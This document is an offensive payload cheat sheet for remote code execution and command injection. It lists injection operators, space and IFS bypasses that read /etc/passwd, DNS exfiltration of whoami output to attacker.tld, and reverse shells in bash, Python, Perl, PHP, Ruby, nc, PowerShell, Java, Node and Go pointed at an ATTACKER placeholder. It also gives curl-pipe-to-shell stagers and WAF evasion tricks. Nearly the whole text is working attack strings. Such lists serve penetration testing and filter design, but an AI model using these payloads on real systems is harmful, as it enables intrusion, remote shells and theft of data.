# PAYLOADS: RCE / Command Injection
## Version: 1.0 | Domain: payloads

---

## SHELL OPERATORS
```
;id
&id
&&id
|id
||id
`id`
$(id)
%0aid
%0d%0aid
${IFS}id
{cat,/etc/passwd}
"$@"id
```

## SPACE / IFS BYPASS
```
{cat,/etc/passwd}
cat$IFS/etc/passwd
cat${IFS}/etc/passwd
cat$IFS$9/etc/passwd
cat<>/etc/passwd
cat</etc/passwd
X=$'cat\\x20/etc/passwd';$X
```

## NO-OUTPUT EXFIL VIA DNS
```bash
nslookup `whoami`.attacker.tld
ping -c 1 `whoami`.attacker.tld
curl http://`whoami`.attacker.tld
nslookup $(whoami).attacker.tld
```

## REVERSE SHELLS

### bash
```bash
bash -i >& /dev/tcp/ATTACKER/4444 0>&1
exec 5<>/dev/tcp/ATTACKER/4444; cat <&5 | while read l; do $l 2>&5 >&5; done
```

### Python
```python
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("sh")'
```

### Perl
```perl
perl -e 'use Socket;$i="ATTACKER";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### PHP
```php
php -r '$s=fsockopen("ATTACKER",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Ruby
```ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("ATTACKER","4444");loop{c.print "$ ";cmd=c.gets;IO.popen(cmd,"r"){|io|c.print io.read}}'
```

### nc
```bash
nc -e /bin/sh ATTACKER 4444
mknod /tmp/p p; nc ATTACKER 4444 0</tmp/p | /bin/sh 1>/tmp/p
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER 4444 >/tmp/f
```

### PowerShell
```powershell
powershell -nop -W hidden -EncodedCommand <BASE64>
# decoded: $client = New-Object System.Net.Sockets.TCPClient('ATTACKER',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

### Java
```java
String[] cmd = {"/bin/sh","-c","exec 5<>/dev/tcp/ATTACKER/4444;cat <&5 | while read l; do $l 2>&5 >&5; done"};
Runtime.getRuntime().exec(cmd);
```

### Node
```javascript
require('child_process').exec('bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"')
```

### Go
```go
package main
import ("net";"os/exec";"os")
func main(){c,_:=net.Dial("tcp","ATTACKER:4444");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run();os.Exit(0)}
```

## STAGER (DOWNLOAD AND EXEC)
```
curl http://attacker.tld/x.sh | sh
wget -qO- http://attacker.tld/x.sh | bash
fetch -o - http://attacker.tld/x.sh | sh
python3 -c 'import urllib.request,os;os.system(urllib.request.urlopen("http://attacker.tld/x.sh").read())'
```

## WAF / FILTER BYPASS
```
\\$(whoami)
'w'h'o'a'm'i
"w"h"o"a"m"i
wh\\\\oami
$(printf 'whoami')
$(echo -e \\x77\\x68\\x6f\\x61\\x6d\\x69)
$(echo d2hvYW1p|base64 -d)
${PATH:0:1}                                # = '/'
$(@id)
{cat,/etc/passwd}
${IFS}cat${IFS}/etc/passwd
```

## OBFUSCATED ID
```
${IFS%??}id
$0<<<id
`echo aWQ=|base64 -d`
$'\\x69\\x64'
```

## REFERENCES
GTFOBins, PayloadsAllTheThings, revshells.com
